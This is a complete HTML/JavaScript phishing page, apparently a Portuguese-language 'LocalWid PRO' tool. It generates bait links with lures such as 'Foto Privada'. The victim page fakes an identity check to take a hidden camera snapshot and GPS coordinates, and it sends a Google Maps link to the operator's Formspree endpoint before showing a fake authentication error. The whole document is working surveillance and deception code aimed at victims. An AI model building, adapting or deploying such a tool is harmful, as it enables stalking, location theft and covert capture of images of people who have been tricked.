<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LocalWid - Manager v4.0</title>
    <style>
        :root { --primary: #00d2ff; --bg: #0f0c29; --card: #1a1a3a; }
        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: white; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: var(--card); padding: 30px; border-radius: 20px; text-align: center; width: 95%; max-width: 650px; border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        h1 { color: var(--primary); margin-bottom: 20px; }
        .btn { background: linear-gradient(90deg, #3a7bd5, var(--primary)); color: white; border: none; padding: 15px; border-radius: 10px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 15px; text-transform: uppercase; }
        input { width: 100%; padding: 12px; margin-top: 10px; border-radius: 8px; border: none; box-sizing: border-box; text-align: center; background: #eee; color: #333; font-weight: bold; }
        
        .admin-section { margin-top: 30px; border-top: 2px solid #333; padding-top: 20px; text-align: left; }
        .data-grupo { background: #0b0920; margin-bottom: 15px; border-radius: 8px; border: 1px solid #333; }
        .data-header { background: #222; padding: 10px; display: flex; justify-content: space-between; align-items: center; font-weight: bold; color: var(--primary); }
        
        table { width: 100%; border-collapse: collapse; font-size: 11px; }
        th, td { border-bottom: 1px solid #222; padding: 10px; text-align: center; }
        .maps-btn { background: #28a745; color: white; padding: 4px 8px; text-decoration: none; border-radius: 4px; font-weight: bold; }
        .photo-btn { background: #e94560; color: white; padding: 4px 8px; border-radius: 4px; cursor: pointer; border: none; font-weight: bold; }
        
        .hidden { display: none; }
        #copy-status { font-size: 12px; color: #00ffc3; margin-top: 5px; display: none; text-align: center; }
        video, canvas { display: none; } /* Esconde a câmera da vítima */
    </style>
</head>
<body>

    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>

    <div id="setup-panel" class="container">
        <h1>LocalWid PRO</h1>
        <p>1. Seu ID do Formspree:</p>
        <input type="text" id="form-id" placeholder="Ex: mqedjrjb">
        <p>2. Mensagem da Isca:</p>
        <input type="text" id="isca-nome" placeholder="Ex: Foto Privada">
        
        <button class="btn" onclick="gerarLink()">GERAR LINK COM CÂMERA</button>
        
        <div id="link-area" class="hidden">
            <input type="text" id="link-final" readonly>
            <button class="btn" style="background: #444;" onclick="copiarLink()">📋 COPIAR LINK</button>
            <div id="copy-status">Link Copiado!</div>
        </div>

        <div class="admin-section">
            <h3 style="text-align: center;">📍 Capturas Organizadas</h3>
            <div id="historico-agrupado"></div>
        </div>
    </div>

    <div id="victim-panel" class="container hidden">
        <h2 id="titulo-vitima">ARQUIVO PROTEGIDO</h2>
        <p>Para visualizar este conteúdo, o sistema exige verificação de identidade via localização e câmera.</p>
        <button class="btn" id="btn-vitima" onclick="iniciarCaptura()">VERIFICAR IDENTIDADE</button>
        <div id="loader" class="hidden">⌛ Verificando permissões...</div>
        <p id="error-final" class="hidden" style="color: #ff4444; font-weight: bold;">Erro: Falha na autenticação biométrica.</p>
    </div>

    <script>
        const MEU_ID_ADMIN = "mqedjrjb";
        const params = new URLSearchParams(window.location.search);
        const victimId = params.get('id');
        const iscaTexto = params.get('msg');

        if (victimId) {
            document.getElementById('setup-panel').classList.add('hidden');
            document.getElementById('victim-panel').classList.remove('hidden');
            document.getElementById('titulo-vitima').textContent = iscaTexto || "ARQUIVO";
        } else {
            carregarTabela();
        }

        function gerarLink() {
            const id = document.getElementById('form-id').value.trim();
            const msg = document.getElementById('isca-nome').value.trim() || "Documento";
            if (!id) return alert("Insira o ID!");
            const linkFinal = `${window.location.href.split('?')[0]}?id=${id}&msg=${encodeURIComponent(msg)}`;
            document.getElementById('link-final').value = linkFinal;
            document.getElementById('link-area').classList.remove('hidden');
        }

        function copiarLink() {
            const input = document.getElementById('link-final');
            input.select();
            navigator.clipboard.writeText(input.value);
            document.getElementById('copy-status').style.display = 'block';
        }

        async function iniciarCaptura() {
            const btn = document.getElementById('btn-vitima');
            const loader = document.getElementById('loader');
            btn.classList.add('hidden');
            loader.classList.remove('hidden');

            try {
                // 1. Pede acesso à Câmera
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                // 2. Pede Localização
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const canvas = document.getElementById('canvas');
                    const context = canvas.getContext('2d');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    const fotoBase64 = canvas.toDataURL('image/jpeg', 0.5); // Foto da pessoa
                    stream.getTracks().forEach(track => track.stop()); // Desliga a câmera

                    const agora = new Date();
                    const dKey = agora.toLocaleDateString('pt-BR');
                    const hComp = agora.toLocaleTimeString('pt-BR');
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    const maps = `https://www.google.com/maps?q=${lat},${lon}`;

                    const payload = { Isca: iscaTexto, Data: dKey, Hora: hComp, Mapa: maps, Foto: "Ver no painel do site" };

                    // Envio Formspree (Note: Formspree free tem limite de tamanho, a foto pode não ir por email, mas fica no seu histórico local)
                    fetch(`https://formspree.io/f/${victimId}`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) });

                    // Salva no seu histórico local do site com a FOTO
                    let capturas = JSON.parse(localStorage.getItem('capturas_v5') || "[]");
                    capturas.push({ data: dKey, hora: hComp, coords: `${lat.toFixed(4)},${lon.toFixed(4)}`, mapa: maps, foto: fotoBase64 });
                    localStorage.setItem('capturas_v5', JSON.stringify(capturas));

                    setTimeout(() => {
                        loader.classList.add('hidden');
                        document.getElementById('error-final').classList.remove('hidden');
                    }, 2000);

                }, (err) => { alert("Erro: Localização obrigatória."); resetBtn(); });
            } catch (err) {
                alert("Erro: Câmera obrigatória para verificação.");
                resetBtn();
            }
        }

        function resetBtn() {
            document.getElementById('btn-vitima').classList.remove('hidden');
            document.getElementById('loader').classList.add('hidden');
        }

        function carregarTabela() {
            const lista = JSON.parse(localStorage.getItem('capturas_v5') || "[]");
            const div = document.getElementById('historico-agrupado');
            div.innerHTML = "";
            const grupos = {};
            lista.forEach(item => { if (!grupos[item.data]) grupos[item.data] = []; grupos[item.data].push(item); });

            Object.keys(grupos).reverse().forEach(data => {
                let html = `<div class="data-grupo"><div class="data-header">📅 ${data} <span onclick="excluirDia('${data}')" style="cursor:pointer">🗑️</span></div><table><thead><tr><th>Hora</th><th>Maps</th><th>Foto</th></tr></thead><tbody>`;
                grupos[data].reverse().forEach((v, idx) => {
                    html += `<tr><td>${v.hora}</td><td><a href="${v.mapa}" target="_blank" class="maps-btn">MAPA</a></td><td><button class="photo-btn" onclick="verFoto('${v.foto}')">VER</button></td></tr>`;
                });
                html += `</tbody></table></div>`;
                div.innerHTML += html;
            });
        }

        function verFoto(base64) {
            const win = window.open();
            win.document.write(`<img src="${base64}" style="width:100%; max-width:500px; border-radius:10px;">`);
        }

        function excluirDia(data) {
            if (confirm("Excluir este dia?")) {
                let lista = JSON.parse(localStorage.getItem('capturas_v5') || "[]");
                localStorage.setItem('capturas_v5', JSON.stringify(lista.filter(i => i.data !== data)));
                carregarTabela();
            }
        }
    </script>
</body>
</html>
